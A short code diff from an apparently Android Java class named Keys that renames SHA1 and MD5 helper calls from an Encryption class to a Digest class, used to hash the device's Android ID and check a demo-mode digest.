@@ -113,7 +113,7 @@ public class Keys {
 				Check.log(TAG + " (Keys), androidId: " + androidId);
 			}
 
-			instanceId = Encryption.SHA1(androidId.getBytes());
+			instanceId = Digest.SHA1(androidId.getBytes());
 
 			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.resources), 0); // resources.bin
 
@@ -144,7 +144,7 @@ public class Keys {
             (byte) 0x5d, (byte) 0x94, (byte) 0xf3, (byte) 0xc6, (byte) 0x7a,
             (byte) 0x58, (byte) 0xd5, (byte) 0x2c, (byte) 0x52 };
 		
-		byte[] calculated = Encryption.MD5(demoMode);
+		byte[] calculated = Digest.MD5(demoMode);
 		
 		boolean ret = Arrays.equals(calculated, demoDigest);
 		
